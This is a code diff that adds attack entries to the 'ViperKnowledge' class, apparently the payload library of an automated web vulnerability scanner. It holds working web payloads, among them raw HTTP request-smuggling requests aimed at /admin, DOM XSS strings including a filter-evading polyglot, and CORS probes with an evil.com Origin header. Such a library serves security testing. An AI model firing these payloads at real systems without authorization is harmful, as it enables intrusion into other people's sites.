@@ -809,6 +809,96 @@ class ViperKnowledge:
                 failure_markers=["400 Bad Request", "blocked"],
                 followups=["auth_bypass_header"]
             ),
+
+            # === MISSING ATTACK TYPES (v6.0) ===
+
+            Attack(
+                name="clickjacking",
+                category="misc",
+                payloads=["GET /"],
+                indicators=["http", "html"],
+                success_markers=[],  # Checked via header absence
+                failure_markers=["X-Frame-Options", "frame-ancestors"],
+                followups=[]
+            ),
+            Attack(
+                name="csrf_token_leak",
+                category="auth",
+                payloads=[
+                    "GET /", "GET /login", "GET /account", "GET /profile",
+                    "GET /settings", "GET /api/user",
+                ],
+                indicators=["form", "login", "post", "submit"],
+                success_markers=[
+                    r"csrf", r"_token", r"authenticity_token", r"__RequestVerificationToken",
+                    r"csrfmiddlewaretoken", r"X-CSRF-Token",
+                ],
+                failure_markers=[],
+                followups=["csrf_bypass"]
+            ),
+            Attack(
+                name="request_smuggling",
+                category="injection",
+                payloads=[
+                    "POST / HTTP/1.1\r\nHost: {target}\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: {target}\r\n\r\n",
+                    "POST / HTTP/1.1\r\nHost: {target}\r\nTransfer-Encoding: chunked\r\nContent-Length: 6\r\n\r\n0\r\n\r\nG",
+                ],
+                indicators=["http", "proxy", "reverse_proxy", "haproxy", "nginx", "cloudflare"],
+                success_markers=[r"HTTP/1\.1 (?:200|301|302|403)", r"admin", r"forbidden"],
+                failure_markers=[r"400 Bad Request"],
+                followups=[]
+            ),
+            Attack(
+                name="dom_xss",
+                category="injection",
+                payloads=[
+                    "<img src=x onerror=alert(1)>",
+                    "javascript:alert(document.domain)",
+                    "'-alert(1)-'",
+                    "\"><img src=x onerror=alert(1)>",
+                    "{{constructor.constructor('return this')()}}",
+                    "${alert(1)}",
+                    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//",
+                ],
+                indicators=["search", "q", "query", "name", "message", "comment", "text", "input", "value"],
+                success_markers=[
+                    r"<img[^>]*onerror", r"javascript:", r"alert\(",
+                    r"onerror\s*=", r"onload\s*=", r"onclick\s*=",
+                ],
+                failure_markers=[r"&lt;img", r"&lt;script"],
+                followups=["xss_stored"]
+            ),
+            Attack(
+                name="cors_misconfiguration",
+                category="misc",
+                payloads=[
+                    "Origin: https://evil.com",
+                    "Origin: null",
+                    "Origin: https://{target}.evil.com",
+                ],
+                indicators=["api", "http", "ajax", "fetch"],
+                success_markers=[
+                    r"Access-Control-Allow-Origin:\s*\*",
+                    r"Access-Control-Allow-Origin:\s*https?://evil",
+                    r"Access-Control-Allow-Origin:\s*null",
+                    r"Access-Control-Allow-Credentials:\s*true",
+                ],
+                failure_markers=[],
+                followups=[]
+            ),
+            Attack(
+                name="security_headers_missing",
+                category="misc",
+                payloads=["GET /"],
+                indicators=["http"],
+                success_markers=[],  # Checked via header absence
+                failure_markers=[
+                    "Strict-Transport-Security",
+                    "Content-Security-Policy",
+                    "X-Content-Type-Options",
+                ],
+                followups=[]
+            ),
         ]
 
         for attack in attacks_data:
